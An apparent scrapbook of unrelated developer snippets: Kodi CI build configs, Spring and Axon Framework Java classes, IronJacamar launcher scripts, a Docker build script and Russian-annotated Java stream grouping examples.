        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-ffmpeg-3.3-1-any.pkg.tar.xz | tar xJv"
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-libdvdcss-1.4.0-1-any.pkg.tar.xz | tar xJv"
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-libdvdnav-5.0.3-1-any.pkg.tar.xz | tar xJv"
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-libdvdread-5.0.3-1-any.pkg.tar.xz | tar xJv"
        # Rename all precompiled lib*.dll.a -> *.lib, so MSVC will find them
        Get-ChildItem mingw32\lib\lib*.dll.a | %{
          $new_name = $_.Name.SubString(3) -replace ".dll.a", ".lib"
          $new_fullname = Join-Path $_.DirectoryName $new_name
          Rename-Item $_.FullName $new_fullname
        }
        # Copy all libs and includes under Kodi's dependencies folder
        xcopy /s /y mingw32\*.* .
        xcopy /s /y mingw32\bin\*.dll $env:APPVEYOR_BUILD_FOLDER\system\
        # Build
        mkdir $env:APPVEYOR_BUILD_FOLDER\kodi-build
        cd $env:APPVEYOR_BUILD_FOLDER\kodi-build
        cmd /c 'cmake -G "Visual Studio 14" .. 2>&1'
        cmd /c 'cmake --build . --target all_build --config RelWithDebInfo 2>&1'
      }
  #
  # Build Addons
  #
  - ps: |
      if ($env:ADDONS.length -ne 0 -and $env:BUILD -ne "Kodi") {
        # Bootstrap
        cd $env:APPVEYOR_BUILD_FOLDER\tools\buildsteps\windows\win32
        & .\bootstrap-addons.bat
        # Create build folder
        md -Force $env:APPVEYOR_BUILD_FOLDER\build | out-null
        cd $env:APPVEYOR_BUILD_FOLDER\build
        # Configure
        cmake -DADDONS_TO_BUILD="$env:ADDONS".* `
              -G "NMake Makefiles" `
              -DCMAKE_BUILD_TYPE="$env:CONFIG" `
              -DCMAKE_INSTALL_PREFIX="$env:APPVEYOR_BUILD_FOLDER"\addons `
              $env:APPVEYOR_BUILD_FOLDER\cmake\addons
        # Build selected addons one by one
        $addons_success=""
        $addons_failed=""
        nmake supported_addons | %{
          if ($_ -like "ALL_ADDONS_BUILDING: *") {
            $_.SubString(21).Split(" ") | %{
              Write-Host "Building " $_
              nmake $_
              if ($LASTEXITCODE -eq 0) {
                $addons_success += $_ + " "
              } else {
                $addons_failed += $_  + " "
              }
            }
          }
        }
        # Print succesful and failed addons
        Write-Host "--------------------------------------------------"
        if ($addons_success -ne "") {
          $addons_success.Split(" ") | %{
            if ($_ -ne "") {
              Write-Host [SUCCESS] $_ -ForegroundColor Green
            }
          }
        }
        if ($addons_failed -ne "") {
          $addons_failed.Split(" ") | %{
            if ($_ -ne "") {
              Write-Host [ ERROR ] $_ -ForegroundColor Red
            }
          }
          exit 1
        }
      }
test: off
--------------------------------------------------------------------------------------------------------
# Kodi's travis-ci.org integration file

# TODO:
# integrate with slack
# make it perfect... or not ;-r


language: cpp

# Define the build matrix
#
# Travis defaults to building on Ubuntu Precise when building on Linux. We need Trusty in order to get up
# to date versions of cmake and g++.
#
os: linux
dist: xenial
sudo: required
compiler:
  - gcc
  - clang

env:
  - BUILD=Kodi TOOLS=CMake
#  - ADDONS=audiodecoder
#  - ADDONS=audioencoder
#  - ADDONS=pvr
#  - ADDONS=screensaver
#  - ADDONS=visualization

matrix:
  fast_finish: true
  allow_failures:
#    - env: ADDONS=audiodecoder
#    - env: ADDONS=audioencoder
#    - env: ADDONS=pvr
#    - env: ADDONS=screensaver
#    - env: ADDONS=visualization

# Prepare system
#
# Prepare the system to install prerequisites or dependencies
#
before_install:
# Prune non-root Python from PATH. Solves https://github.com/travis-ci/travis-ci/issues/4948
# see: https://github.com/travis-ci/travis-ci/issues/5326
  - export PATH=$(echo $PATH | tr ':' "\n" | sed '/\/opt\/python/d' | tr "\n" ":" | sed "s|::|:|g")

# Linux
#
# Install team-xbmc/xbmc-ppa-build-depends for some dependencies and ppa:wsnipex/vaapi for libda-dev 1.6.0.
# Stupid libda-dev 1.3.0 does not work on Trusty.

  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" ]]; then
      sudo add-apt-repository -y ppa:team-xbmc/xbmc-ppa-build-depends &&
      sudo add-apt-repository -y ppa:wsnipex/vaapi &&
      sudo add-apt-repository -y ppa:pulse-eight/libcec &&
      sudo apt-get update -qq;
    fi

# Install dependencies
#
# Install any prerequisites or dependencies necessary to run our builds
#
install:

# Linux dependencies
#
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" ]]; then
      sudo apt-get install -qq automake autopoint build-essential cmake curl default-jre gawk gdb gdc
      gettext git-core gperf libasound2-dev libass-dev libbluray-dev libbz2-dev libcap-dev libcdio-dev libcec4-dev libcrossguid-dev libcurl3
      libcurl4-openssl-dev libdbus-1-dev libegl1-mesa-dev libfmt3-dev libfontconfig-dev libfreetype6-dev libfribidi-dev libfstrcmp-dev libgif-dev libgl1-mesa-dev
      libglu1-mesa-dev libiso9660-dev libjpeg-dev liblcms2-dev libltdl-dev liblzo2-dev libmicrohttpd-dev libmysqlclient-dev libnfs-dev
      libpcre3-dev libplist-dev libpng-dev libpulse-dev libsmbclient-dev libsqlite3-dev
      libssl-dev libtag1-dev libtinyxml-dev libtool libudev-dev libusb-dev libva-dev libvdpau-dev
      libxml2-dev libxmu-dev libxrandr-dev libxrender-dev libxslt1-dev libxt-dev mesa-utils
      nasm pmount python-dev python-imaging python-sqlite rapidjson-dev swig unzip uuid-dev yasm zip zlib1g-dev;
    fi

# Prepare builds
#
before_script:

# Linux
#
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" ]]; then
      ulimit -c unlimited -S;
      mkdir $TRAVIS_BUILD_DIR/build &&
      cd $TRAVIS_BUILD_DIR/build;
    fi
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" && "$CXX" == "g++" ]]; then
      cmake -DCMAKE_BUILD_TYPE=Debug ..;
    fi
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" && "$CXX" == "clang++" ]]; then
      cmake -DCMAKE_CXX_FLAGS="-Qunused-arguments" ..;
    fi
  - if [[ "$BUILD" != "Kodi" ]] && [[ "$ADDONS" == "audiodecoder" || "$ADDONS" == "audioencoder" ||
          "$ADDONS" == "pvr" || "$ADDONS" == "screensaver" || "$ADDONS" == "visualization" ]]; then
      cd $TRAVIS_BUILD_DIR/cmake/addons &&
      mkdir -p build &&
      cd build/ &&
      cmake ../bootstrap -DCMAKE_BUILD_TYPE=Debug &&
      make -j4;
    fi

# Actually build
#
script:
  - if [[ "$BUILD" == "Kodi" ]]; then
      make -j4 &&
      make check;
    fi
  - if [[ "$BUILD" != "Kodi" ]] && [[ "$ADDONS" == "audiodecoder" || "$ADDONS" == "audioencoder" ||
          "$ADDONS" == "pvr" || "$ADDONS" == "screensaver" || "$ADDONS" == "visualization" ]]; then
      cd $TRAVIS_BUILD_DIR/ &&
      mkdir -p build &&
      cmake -DADDONS_TO_BUILD="$ADDONS".* -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=../addons $TRAVIS_BUILD_DIR/cmake/addons &&
      make -j4;
    fi

after_failure:
  - COREFILE=$(find . -maxdepth 1 -name "core*" | head -n 1)
  - if [[ -f "$COREFILE" ]]; then
      gdb -c "$COREFILE" kodi-test -ex "thread apply all bt" -ex "set pagination 0" -batch;
    fi

# Disable annoying emails

notifications:
  email: false
--------------------------------------------------------------------------------------------------------
Install-Package Dapper -Version 1.42.0
--------------------------------------------------------------------------------------------------------
import java.io.File;
import java.io.IOException;
import nu.xom.Builder;
import nu.xom.Document;
import nu.xom.Element;
import nu.xom.Elements;
import nu.xom.ParsingException;

public class XMLReader {
    
    public static void main(String[] args) throws ParsingException, IOException{
        File file = new File("insert path here");
        // builder builds xml data
        Builder builder = new Builder();
        Document doc = builder.build(file);
        
        // get the root element <example>
        Element root = doc.getRootElement();
        
        // gets all element with tag <person>
        Elements people = root.getChildElements("person");
        
        for (int q = 0; q < people.size(); q++){
            // get the current person element
            Element person = people.get(q);
            
            // get the name element and its children: first and last
            Element nameElement = person.getFirstChildElement("name");
            Element firstNameElement = nameElement.getFirstChildElement("first");
            Element lastNameElement = nameElement.getFirstChildElement("last");
            
            // get the age element
            Element ageElement = person.getFirstChildElement("age");
            
            // get the favorite color element
            Element favColorElement = person.getFirstChildElement("fav_color");
            
            String fName, lName, ageUnit, favColor;
            int age;
            
            try {
                fName = firstNameElement.getValue();
                lName = lastNameElement.getValue();
                age = Integer.parseInt(ageElement.getValue());
                ageUnit = ageElement.getAttributeValue("unit");
                favColor = favColorElement.getValue();
                
                System.out.println("Name: " + lName + ", " + fName);
                System.out.println("Age: " + age + " (" + ageUnit + ")");
                System.out.println("Favorite Color: " + favColor);
                System.out.println("----------------");
                
            } catch (NullPointerException ex){
                ex.printStackTrace();
            } catch (NumberFormatException ex){
                ex.printStackTrace();
            }
        }
    }   
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.chile.core.annotations.MetaClass;
import com.haulmont.cuba.core.entity.annotation.UnavailableInSecurityConstraints;
import com.haulmont.cuba.core.global.UuidProvider;

import javax.persistence.Column;
import javax.persistence.Id;
import javax.persistence.MappedSuperclass;
import java.util.UUID;

/**
 * Base class for entities with UUID identifier.
 * <p>
 * Inherit from it if you need an entity without optimistic locking, create, update and soft deletion info.
 */
@MappedSuperclass
@MetaClass(name = "sys$BaseUuidEntity")
@UnavailableInSecurityConstraints
public abstract class BaseUuidEntity extends BaseGenericIdEntity<UUID> implements HasUuid {

    private static final long serialVersionUID = -2217624132287086972L;

    @Id
    @Column(name = "ID")
    protected UUID id;

    public BaseUuidEntity() {
        id = UuidProvider.createUuid();
    }

    @Override
    public UUID getId() {
        return id;
    }

    @Override
    public void setId(UUID id) {
        this.id = id;
    }

    @Override
    public UUID getUuid() {
        return id;
    }

    public void setUuid(UUID uuid) {
        this.id = uuid;
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.ApplicationEvent;

import javax.annotation.Nullable;

public class HealthCheckEvent extends ApplicationEvent {

    protected String response;

    /**
     * Create a new ApplicationEvent.
     *
     * @param source the object on which the event initially occurred (never {@code null})
     */
    public HealthCheckEvent(Object source) {
        super(source);
    }

    @Nullable
    public String getResponse() {
        return response;
    }

    public void setResponse(String response) {
        this.response = response;
    }
}
--------------------------------------------------------------------------------------------------------
// create HTML with JavaScript data     StringBuilder html = new StringBuilder(); 
html.append("<!DOCTYPE html> <html> <head> <title>Hello Jsoup!</title>");     html.append("<script>");     html.append("StackExchange.docs.comments.init({");     html.append("highlightColor: '#F4A83D',");     html.append("backgroundColor:'#FFF',");     html.append("});");     html.append("</script>");     html.append("<script>");     html.append("document.write(<style type='text/css'>div,iframe { top: 0; position:absolute; }</style>');");     html.append("</script>\n");     html.append("</head><body></body> </html>");     // parse as HTML document     Document doc = Jsoup.parse(html.toString());     String defaultBackground = "backgroundColor:'#FFF'";     // get <script>     for (Element scripts : doc.getElementsByTag("script")) {         // get data from <script>         for (DataNode dataNode : scripts.dataNodes()) {             // find data which contains backgroundColor:'#FFF'             if (dataNode.getWholeData().contains(defaultBackground)) {                 // replace '#FFF' -> '#ddd'                 String newData = dataNode.getWholeData().replaceAll(defaultBackground, "backgroundColor:'#ddd'");                 // set new data contents                 dataNode.setWholeData(newData);             }         }     }     System.out.println(doc.toString());
--------------------------------------------------------------------------------------------------------4
import com.haulmont.cuba.core.global.TimeSource;

import javax.validation.ClockProvider;
import java.time.Clock;
import java.time.ZonedDateTime;

public class CubaValidationTimeProvider implements ClockProvider {

    protected TimeSource timeSource;

    public CubaValidationTimeProvider(TimeSource timeSource) {
        this.timeSource = timeSource;
    }

    @Override
    public Clock getClock() {
        ZonedDateTime now = timeSource.now();
        return Clock.fixed(now.toInstant(), now.getZone());
    }
}
--------------------------------------------------------------------------------------------------------

    @Override
    public String toString() {
        return MoreObjects.toStringHelper(this)
                .add("entityName", entityName)
                .add("variableName", variableName)
                .toString();
    }
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.databind.ObjectMapper;
import org.axonframework.springboot.SerializerProperties;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.boot.autoconfigure.AutoConfigureBefore;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@AutoConfigureBefore(AxonAutoConfiguration.class)
@AutoConfigureAfter(name = "org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration")
@ConditionalOnClass(name = "com.fasterxml.jackson.databind.ObjectMapper")
@EnableConfigurationProperties(value = SerializerProperties.class)
public class ObjectMapperAutoConfiguration {

    @Bean("defaultAxonObjectMapper")
    @ConditionalOnMissingBean
    @ConditionalOnExpression("'${axon.serializer.general}' == 'jackson' || '${axon.serializer.events}' == 'jackson' || '${axon.serializer.messages}' == 'jackson'")
    public ObjectMapper defaultAxonObjectMapper() {
        return new ObjectMapper().findAndRegisterModules();
    }
}
--------------------------------------------------------------------------------------------------------
import org.axonframework.samples.trader.infra.config.CQRSInfrastructureConfig;
import org.axonframework.samples.trader.infra.config.PersistenceInfrastructureConfig;
import org.axonframework.samples.trader.listener.config.ExternalListenersConfig;
import org.axonframework.samples.trader.orders.config.OrderConfig;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.context.annotation.ImportResource;

@Configuration
@Import({
        CQRSInfrastructureConfig.class,
        PersistenceInfrastructureConfig.class,
        OrderConfig.class,
        ExternalListenersConfig.class
})
@ImportResource("classpath:META-INF/spring/security-context.xml")
public class AppConfig {

}

public enum TransactionState {
    STARTED, CONFIRMED, CANCELLED, EXECUTED, PARTIALLY_EXECUTED
}


import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseFactoryBean;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;

@Configuration
public class PersistenceInfrastructureConfig {

    @Bean
    @Profile("hsqldb")
    public EmbeddedDatabaseFactoryBean dataSource() {
        EmbeddedDatabaseFactoryBean embeddedDatabaseFactoryBean = new EmbeddedDatabaseFactoryBean();
        embeddedDatabaseFactoryBean.setDatabaseType(EmbeddedDatabaseType.HSQL);

        return embeddedDatabaseFactoryBean;
    }
}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;

@Configuration
@EnableWebSocket
public class WebSocketConfig implements WebSocketConfigurer {

    @Autowired
    private ExecutedTradesBroadcaster executedTradesBroadcaster;

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(executedTradesBroadcaster, "/eventbus")
                .withSockJS();
    }
}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.ConcurrentWebSocketSessionDecorator;
import org.springframework.web.socket.handler.TextWebSocketHandler;

import java.io.IOException;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

class BroadcastingTextWebSocketHandler extends TextWebSocketHandler {

    private static final Logger logger = LoggerFactory.getLogger(BroadcastingTextWebSocketHandler.class);
    private Map<String, WebSocketSession> sessions = new ConcurrentHashMap<>();

    @Override
    public void afterConnectionEstablished(WebSocketSession session) throws Exception {
        super.afterConnectionEstablished(session);

        sessions.put(session.getId(),
                     new ConcurrentWebSocketSessionDecorator(session, (int) TimeUnit.SECONDS.toMillis(10), 5 * 1024));
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) throws Exception {
        super.afterConnectionClosed(session, status);

        sessions.remove(session.getId());
    }

    protected void broadcast(String data) {
        final TextMessage message = new TextMessage(data);
        sessions.forEach((key, session) -> {
            try {
                session.sendMessage(message);
            } catch (IOException e) {
                logger.warn("An error occurred while trying to send a message to a WebSocket", e);
            }
        });
    }
}
--------------------------------------------------------------------------------------------------------
Присоединяюсь к поздравлениям коллег. Ольга, поздравляю с Днем Рождения! Желаю исполнения желаний и удачи в достижении поставленных целей!

org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
  org.axonframework.extensions.springcloud.autoconfig.RoutingStrategyAutoConfiguration,\
  org.axonframework.extensions.springcloud.autoconfig.SpringCloudAutoConfiguration
--------------------------------------------------------------------------------------------------------
@Bean(initMethod = "start", destroyMethod = "shutDown")
--------------------------------------------------------------------------------------------------------
#!/bin/sh
export IDEA="/C/Program Files (x86)/JetBrains/IntelliJ IDEA 14.1"
if [ ! -e "$IDEA" ]
then
    export IDEA="/Applications/IntelliJ IDEA 14.app/Contents"
fi
if [ ! -e "$IDEA" ]
then
    export IDEA="/Applications/IntelliJ IDEA CE.app/Contents"
fi
if [ ! -e "$IDEA" ]
then
    echo "IDEA libraries not found!"
    echo "Checked: /C/Program Files (x86)/JetBrains/IntelliJ IDEA 14.1"
    echo "Checked: /Applications/IntelliJ IDEA 14.app/Contents"
    echo "Checked: /Applications/IntelliJ IDEA CE.app/Contents"
    echo ""
    echo "Try installing the IDEA Community Edition"
    exit 1
fi

export IDEA_VERSION=LOCAL
mvn install:install-file -Dfile="$IDEA/lib/annotations.jar" -DgroupId=com.intellij.idea -DartifactId=annotations -Dversion=$IDEA_VERSION -Dpackaging=jar
mvn install:install-file -Dfile="$IDEA/lib/idea.jar" -DgroupId=com.intellij.idea -DartifactId=idea -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION
mvn install:install-file -Dfile="$IDEA/lib/openapi.jar" -DgroupId=com.intellij.idea -DartifactId=openapi -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION
mvn install:install-file -Dfile="$IDEA/lib/util.jar" -DgroupId=com.intellij.idea -DartifactId=util -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION
mvn install:install-file -Dfile="$IDEA/lib/extensions.jar" -DgroupId=com.intellij.idea -DartifactId=extensions -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION

git update-index --assume-unchanged META-INF/plugin.xml
--------------------------------------------------------------------------------------------------------
import org.springframework.cloud.client.discovery.EnableDiscoveryClient;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;

@Profile("distributed")
@EnableDiscoveryClient
@Configuration
public class DistributedConfiguration {

}
--------------------------------------------------------------------------------------------------------
import org.apache.commons.lang3.ArrayUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.messaging.simp.config.MessageBrokerRegistry;
import org.springframework.web.socket.config.annotation.AbstractWebSocketMessageBrokerConfigurer;
import org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;
import org.springframework.web.socket.config.annotation.StompEndpointRegistry;

@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig extends AbstractWebSocketMessageBrokerConfigurer {

    @Autowired
    private Environment environment;

    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        if (ArrayUtils.contains(environment.getActiveProfiles(), "distributed-command-bus")) {
            config.enableStompBrokerRelay("/topic")
                  .setRelayHost("rabbitmq");
        } else {
            config.enableSimpleBroker("/topic");
        }
        config.setApplicationDestinationPrefixes("/app");
    }

    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/websocket")
                .withSockJS();
    }
}
--------------------------------------------------------------------------------------------------------
import com.mongodb.DBObject;
import com.mongodb.util.JSON;
import org.axonframework.serialization.ContentTypeConverter;

/**
 * ContentTypeConverter implementation that converts a DBObject structure into a String containing its Binary JSON
 * representation.
 *
 * @author Allard Buijze
 * @since 2.0
 */
public class DBObjectToStringContentTypeConverter implements ContentTypeConverter<DBObject,String> {

    @Override
    public Class<DBObject> expectedSourceType() {
        return DBObject.class;
    }

    @Override
    public Class<String> targetType() {
        return String.class;
    }

    @Override
    public String convert(DBObject original) {
        return JSON.serialize(original);
    }
}
--------------------------------------------------------------------------------------------------------
/**
 * Auto configuration for {@link RoutingStrategy}.
 *
 * @author Milan Savic
 * @since 3.1.1
 */
@Configuration
@AutoConfigureBefore(SpringCloudAutoConfiguration.class)
@ConditionalOnExpression("${axon.distributed.enabled:false}")
public class RoutingStrategyAutoConfiguration {

    @Bean
    @ConditionalOnMissingBean
    public RoutingStrategy routingStrategy() {
        return new AnnotationRoutingStrategy(UnresolvedRoutingKeyPolicy.RANDOM_KEY);
    }
}
--------------------------------------------------------------------------------------------------------
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-stdlib-jdk8</artifactId>
            <version>${kotlin.version}</version>
        </dependency>
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-test</artifactId>
            <version>${kotlin.version}</version>
            <scope>test</scope>
        </dependency>
		
            <plugin>
                <groupId>org.jetbrains.kotlin</groupId>
                <artifactId>kotlin-maven-plugin</artifactId>
                <version>${kotlin.version}</version>
                <executions>
                    <execution>
                        <id>compile</id>
                        <phase>compile</phase>
                        <goals>
                            <goal>compile</goal>
                        </goals>
                    </execution>
                    <execution>
                        <id>test-compile</id>
                        <phase>test-compile</phase>
                        <goals>
                            <goal>test-compile</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <jvmTarget>1.8</jvmTarget>
                </configuration>
            </plugin>
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonTypeInfo;

import java.io.Serializable;

/**
 * Token that identifies a single scheduled Event. This token can be used to refer to a specific scheduled event to
 * cancel that timer.
 *
 * @author Allard Buijze
 * @since 0.7
 */
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, property = "@class")
public interface ScheduleToken extends Serializable {

}
--------------------------------------------------------------------------------------------------------
#/bin/bash
echo "Build containers"
cd docker
docker-compose down -v
docker-compose -f "docker-compose.yml" build

#/bin/bash
echo "Shutdown Container"
cd docker
docker-compose down -v
--------------------------------------------------------------------------------------------------------
import java.io.File;

import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.startup.Tomcat;
import org.apache.catalina.webresources.DirResourceSet;
import org.apache.catalina.webresources.StandardRoot;

public class Main {
	public static void main(String[] args) throws Exception {
		String webappDirLocation = "src/main/webapp";
		Tomcat tomcat = new Tomcat();
		String webPort = System.getenv("PORT");
		if (webPort == null || webPort.isEmpty()) {
			webPort = "8080";
		}

		tomcat.setPort(Integer.valueOf(webPort));

		StandardContext ctx = (StandardContext) tomcat.addWebapp("/blogleo", new File(webappDirLocation).getAbsolutePath());
		System.out.println("configuring app with basedir: " + new File(webappDirLocation).getAbsolutePath());
		
		ctx.setReloadable(true);
		// Declare an alternative location for your "WEB-INF/classes" dir
		// Servlet 3.0 annotation will work
		File additionWebInfClasses = new File("target/classes");
		WebResourceRoot resources = new StandardRoot(ctx);
		resources.addPreResources(
				new DirResourceSet(resources, "/WEB-INF/classes", additionWebInfClasses.getAbsolutePath(), "/"));
		ctx.setResources(resources);
		
		ctx.addWelcomeFile("index.html");
		tomcat.start();

		tomcat.getServer().await();
	}
}
--------------------------------------------------------------------------------------------------------
<plugin>
  <description></description>
  <groupId>org.ironjacamar</groupId>
  <artifactId>ironjacamar-validator</artifactId>
  <version>@VERSION.IRONJACAMAR@</version>
  <goalPrefix>ironjacamar</goalPrefix>
  <isolatedRealm>false</isolatedRealm>
  <inheritedByDefault>true</inheritedByDefault>
  <mojos>
    <mojo>
      <goal>validate</goal>
      <description>Validate rar package file.</description>
      <requiresDirectInvocation>false</requiresDirectInvocation>
      <requiresProject>false</requiresProject>
      <requiresReports>false</requiresReports>
      <aggregator>false</aggregator>
      <requiresOnline>false</requiresOnline>
      <inheritedByDefault>true</inheritedByDefault>
      <phase>package</phase>
      <implementation>org.ironjacamar.validator.maven.ValidatorMojo</implementation>
      <language>java</language>
      <instantiationStrategy>per-lookup</instantiationStrategy>
      <executionStrategy>once-per-session</executionStrategy>
      <parameters>
        <parameter>
          <name>outputDir</name>
          <type>java.lang.String</type>
          <required>true</required>
          <editable>true</editable>
          <description>The output directory.</description>
        </parameter>
        <parameter>
          <name>rarFile</name>
          <type>java.io.File</type>
          <required>true</required>
          <editable>true</editable>
          <description>The rar filename to be validated.</description>
        </parameter>
        <parameter>
          <name>classpath</name>
          <type>java.lang.String[]</type>
          <required>false</required>
          <editable>true</editable>
          <description>The classpath.</description>
        </parameter>
      </parameters>
    </mojo>
  </mojos>
  <dependencies>
    <groupId>org.ironjacamar</groupId>
    <artifactId>ironjacamar-validator</artifactId>
    <version>@VERSION.IRONJACAMAR@</version>
  </dependencies>
</plugin>
--------------------------------------------------------------------------------------------------------
#!/bin/sh
### ====================================================================== ###
##                                                                          ##
##  IronJacamar Script                                                      ##
##                                                                          ##
### ====================================================================== ###

### $Id: $ ###

DIRNAME=`dirname $0`

# Setup IRONJACAMAR_HOME
if [ "x$IRONJACAMAR_HOME" = "x" ]; then
    # get the full path (without any relative bits)
    IRONJACAMAR_HOME=`cd $DIRNAME/..; pwd`
fi
export IRONJACAMAR_HOME

# Setup the java endorsed dirs
IRONJACAMAR_ENDORSED_DIRS="$IRONJACAMAR_HOME/lib/endorsed"

# Setup the JVM
if [ "x$JAVA" = "x" ]; then
    if [ "x$JAVA_HOME" != "x" ]; then
        JAVA="$JAVA_HOME/bin/java"
    else
        JAVA="java"
    fi
fi

# Setup the JVM options
JAVA_OPTS="$JAVA_OPTS"

# Display the environment
echo "========================================================================="
echo ""
echo "  IronJacamar"
echo ""
echo "  IRONJACAMAR_HOME: $IRONJACAMAR_HOME"
echo ""
echo "  JAVA: $JAVA"
echo ""
echo "  JAVA_OPTS: $JAVA_OPTS"
echo ""
echo "========================================================================="
echo ""

# Start IronJacamar
"$JAVA" $JAVA_OPTS \
    -Djava.endorsed.dirs="$IRONJACAMAR_ENDORSED_DIRS" \
    -Djava.util.logging.manager=org.jboss.logmanager.LogManager \
    -Dorg.jboss.logging.Logger.pluginClass=org.jboss.logging.logmanager.LoggerPluginImpl \
    -Dlog4j.defaultInitOverride=true \
    -jar ../lib/ironjacamar-sjc.jar "$@"
	
	
@echo off
rem -------------------------------------------------------------------------
rem IronJacamar Script for Windows
rem -------------------------------------------------------------------------

rem $Id: $

@if not "%ECHO%" == ""  echo %ECHO%
@if "%OS%" == "Windows_NT" setlocal

if "%OS%" == "Windows_NT" (
  set "DIRNAME=%~dp0%"
) else (
  set DIRNAME=.\
)

pushd %DIRNAME%..
if "x%IRONJACAMAR_HOME%" == "x" (
  set "IRONJACAMAR_HOME=%CD%"
)
popd

set DIRNAME=

if "%OS%" == "Windows_NT" (
  set "PROGNAME=%~nx0%"
) else (
  set "PROGNAME=run.bat"
)

if "x%JAVA_HOME%" == "x" (
  set  JAVA=java
  echo JAVA_HOME is not set. Unexpected results may occur.
  echo Set JAVA_HOME to the directory of your local JDK to avoid this message.
) else (
  set "JAVA=%JAVA_HOME%\bin\java"
)

rem Setup IronJacamar specific properties

rem Setup the java endorsed dirs
set IRONJACAMAR_ENDORSED_DIRS=%IRONJACAMAR_HOME%\lib\endorsed

echo ===============================================================================
echo.
echo   IronJacamar
echo.
echo   IRONJACAMAR_HOME: %IRONJACAMAR_HOME%
echo.
echo   JAVA: %JAVA%
echo.
echo   JAVA_OPTS: %JAVA_OPTS%
echo.
echo ===============================================================================
echo.

:RESTART
"%JAVA%" %JAVA_OPTS% ^
   -Djava.endorsed.dirs="%IRONJACAMAR_ENDORSED_DIRS%" ^
   -Djava.util.logging.manager=org.jboss.logmanager.LogManager ^
   -Dorg.jboss.logging.Logger.pluginClass=org.jboss.logging.logmanager.LoggerPluginImpl ^
   -Dlog4j.defaultInitOverride=true ^
   -jar ..\lib\ironjacamar-sjc.jar %*

if ERRORLEVEL 10 goto RESTART

:END
if "x%NOPAUSE%" == "x" pause

:END_NO_PAUSE
--------------------------------------------------------------------------------------------------------
1. Группировка списка рабочих по их должности (деление на списки)

 Map<String, List<Worker>> map1 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition));


2. Группировка списка рабочих по их должности (деление на множества)

Map<String, Set<Worker>> map2 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, Collectors.toSet()));


3. Подсчет количества рабочих, занимаемых конкретную должность

Map<String, Long> map3 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, Collectors.counting()));


4. Группировка списка рабочих по их должности, при этом нас интересуют только имена

Map<String, Set<String>> map4 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, 
              Collectors.mapping(Worker::getName, Collectors.toSet())));


5. Расчет средней зарплаты для данной должности

Map<String, Double> map5 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition,
              Collectors.averagingInt(Worker::getSalary)));


6. Группировка списка рабочих по их должности, рабочие представлены только именами единой строкой

Map<String, String> map6 = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition,
              Collectors.mapping(Worker::getName, 
                     Collectors.joining(", ", "{","}")))
       );


